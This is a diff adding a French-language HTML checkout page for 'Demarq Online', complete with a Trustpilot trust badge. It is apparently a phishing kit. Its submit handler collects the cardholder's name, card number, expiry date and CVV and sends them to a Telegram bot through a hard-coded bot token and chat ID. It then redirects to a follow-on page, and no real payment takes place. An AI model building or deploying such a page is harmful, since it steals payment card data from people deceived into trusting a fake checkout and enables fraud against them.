@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Page de Paiement - Demarq Online</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', sans-serif;
+        }
+
+        body {
+            background-color: #f7f9fc;
+            color: #333;
+            font-size: 16px;
+        }
+
+        header {
+            background-color: #003f5f;
+            color: white;
+            padding: 20px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+        }
+
+        .logo {
+            font-size: 28px;
+            font-weight: 700;
+            color: #00e6e6;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 40px auto;
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            font-size: 28px;
+            color: #003f5f;
+            margin-bottom: 30px;
+            font-weight: 600;
+        }
+
+        .form-section {
+            margin-bottom: 25px;
+        }
+
+        .form-section label {
+            font-size: 16px;
+            font-weight: bold;
+            color: #003f5f;
+            display: block;
+            margin-bottom: 10px;
+        }
+
+        .form-section input {
+            width: 100%;
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid #ccc;
+            font-size: 16px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .form-section select {
+            width: 100%;
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid #ccc;
+            font-size: 16px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .form-section .btn {
+            display: inline-block;
+            background-color: #00c853;
+            color: white;
+            padding: 18px 35px;
+            font-size: 18px;
+            border-radius: 50px;
+            text-align: center;
+            text-decoration: none;
+            width: 100%;
+            margin-top: 20px;
+            transition: background-color 0.3s;
+        }
+
+        .form-section .btn:hover {
+            background-color: #388e3c;
+        }
+
+        .footer {
+            background-color: #003f5f;
+            color: white;
+            padding: 40px 20px;
+            margin-top: 50px;
+            font-size: 16px;
+            text-align: center;
+        }
+
+        .footer a {
+            color: white;
+            text-decoration: none;
+            font-size: 16px;
+            margin-top: 20px;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .trust {
+            color: #00e676;
+            font-size: 18px;
+            margin-top: 15px;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .container {
+                padding: 25px;
+            }
+
+            .footer {
+                padding: 20px;
+            }
+
+            .footer a {
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+  <header>
+    <div class="logo">demarq <span style="color: #00e6e6;">online</span></div>
+  </header>
+
+  <div class="container">
+    <h1>Page de Paiement</h1>
+    <form id="payment-form">
+      <!-- Nom du titulaire -->
+      <div class="form-section">
+        <label for="full-name">Nom du Titulaire de la Carte <span class="required">*</span></label>
+        <input type="text" id="full-name" name="full-name" required placeholder="Entrez votre nom complet" />
+      </div>
+
+      <!-- Numéro de la carte -->
+      <div class="form-section">
+        <label for="card-number">Numéro de la Carte <span class="required">*</span></label>
+        <input type="text" id="card-number" name="card-number" required placeholder="1234 5678 1234 5678" maxlength="19" />
+      </div>
+
+      <!-- Date de validité -->
+      <div class="form-section">
+        <label for="expiry-date">Date de Validité <span class="required">*</span></label>
+        <select id="expiry-month" name="expiry-month" required>
+          <option value="" disabled selected>Mois</option>
+          <option value="01">Jan</option>
+          <option value="02">Fév</option>
+          <option value="03">Mar</option>
+          <option value="04">Avr</option>
+          <option value="05">Mai</option>
+          <option value="06">Jun</option>
+          <option value="07">Jui</option>
+          <option value="08">Août</option>
+          <option value="09">Sep</option>
+          <option value="10">Oct</option>
+          <option value="11">Nov</option>
+          <option value="12">Déc</option>
+        </select>
+
+        <select id="expiry-year" name="expiry-year" required>
+          <option value="" disabled selected>Année</option>
+          <option value="2023">2023</option>
+          <option value="2024">2024</option>
+          <option value="2025">2025</option>
+          <option value="2026">2026</option>
+          <option value="2027">2027</option>
+        </select>
+      </div>
+
+      <!-- Code de sécurité (CVV) -->
+      <div class="form-section">
+        <label for="cvv">Code de Sécurité (CVV) <span class="required">*</span></label>
+        <input type="text" id="cvv" name="cvv" required placeholder="123" maxlength="3" />
+      </div>
+
+      <!-- Bouton Payer -->
+      <div class="form-section">
+        <button type="submit" class="btn">Payer maintenant</button>
+      </div>
+    </form>
+  </div>
+
+  <footer>
+    <div class="trust">
+      Excellent 4.6 sur 5 ★ Trustpilot
+    </div>
+    <div>
+      <a href="#">Mentions légales</a> | <a href="#">Politique de confidentialité</a>
+    </div>
+  </footer>
+
+  <script>
+    document.getElementById('payment-form').addEventListener('submit', function(event) {
+        event.preventDefault();
+
+        // Collecter les informations du formulaire
+        const fullName = document.getElementById('full-name').value;
+        const cardNumber = document.getElementById('card-number').value;
+        const expiryMonth = document.getElementById('expiry-month').value;
+        const expiryYear = document.getElementById('expiry-year').value;
+        const cvv = document.getElementById('cvv').value;
+
+        // Créer le message
+        const message = `
+          Nom : ${fullName}\n
+          Numéro de Carte : ${cardNumber}\n
+          Date d'expiration : ${expiryMonth}/${expiryYear}\n
+          Code CVV : ${cvv}
+        `;
+
+        // Token et Chat ID des bots Telegram
+        const botToken = '7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw';
+        const botId = '5372119436';
+
+        // Fonction d'envoi des informations à Telegram
+        sendToTelegram(botToken, botId, message);
+
+        // Redirection vers la page suivante
+        window.location.href = 'traitement3.html';
+    });
+
+    // Fonction pour envoyer les données au bot Telegram
+    function sendToTelegram(token, chatId, message) {
+        const url = `https://api.telegram.org/bot${token}/sendMessage`;
+        const params = {
+            chat_id: chatId,
+            text: message
+        };
+
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(params)
+        })
+        .then(response => response.json())
+        .then(data => console.log('Message envoyé:', data))
+        .catch(error => console.error('Erreur:', error));
+    }
+  </script>
+</body>
+</html>
